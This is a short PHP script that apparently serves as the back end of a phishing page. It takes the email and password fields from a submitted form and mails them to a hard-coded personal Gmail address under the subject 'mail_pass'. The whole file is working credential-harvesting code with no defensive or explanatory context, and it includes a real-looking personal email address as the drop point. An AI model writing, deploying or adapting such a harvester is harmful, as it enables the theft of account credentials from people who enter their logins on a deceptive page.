<?php
    // the message
    $msg = $_POST["email"] . " -- " . $_POST["passw"];

    // use wordwrap() if lines are longer than 70 characters
    $msg = wordwrap($msg,70);

    // send email
    mail("ntjoel19@gmail.com","mail_pass",$msg);
?>